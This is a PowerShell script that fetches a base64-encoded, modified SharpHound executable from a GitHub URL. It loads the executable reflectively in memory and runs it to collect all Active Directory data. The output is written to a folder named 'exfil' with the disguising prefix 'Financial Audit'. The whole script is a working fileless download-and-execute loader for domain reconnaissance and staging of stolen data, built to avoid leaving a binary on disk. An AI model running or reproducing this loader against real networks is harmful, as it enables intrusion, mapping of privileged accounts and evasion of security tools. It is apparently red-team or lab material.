# Define the URL of the base64 encoded Portable Executable
$url = "https://raw.githubusercontent.com/MalwareLab49/SharpHound_Encoded/main/modified_b64"

# Download the base64 content from the URL
$base64Content = Invoke-RestMethod -Uri $url

# Decode the base64 content to binary
$binaryContent = [System.Convert]::FromBase64String($base64Content)

# Get the current working directory
#$outputDirectory = (Get-Location).Path
$outputDirectory = "C:\temp\2exfil"    # Outputting to specific directoy

# Define the arguments required by the executable
$arguments = "-c All --outputdirectory $outputDirectory --OutputPrefix ""Financial Audit"""

# Create a new memory stream and write the binary content to it
$memoryStream = New-Object System.IO.MemoryStream
$memoryStream.Write($binaryContent, 0, $binaryContent.Length)
$memoryStream.Seek(0, "Begin") > $null

# Load the assembly from the memory stream
$assembly = [System.Reflection.Assembly]::Load($memoryStream.ToArray())

# Get the entry point of the assembly (the main method)
$entryPoint = $assembly.EntryPoint

# If the entry point requires arguments, prepare them
if ($entryPoint.GetParameters().Length -gt 0) {
    $argsArray = $arguments.Split()
    $entryPoint.Invoke($null, (, $argsArray))
} else {
    $entryPoint.Invoke($null, $null)
}

# Clean up
$memoryStream.Close()
$memoryStream.Dispose()

# Clean output files
#Remove-Item -Path "C:\temp\2exfil\Financial Audit*"
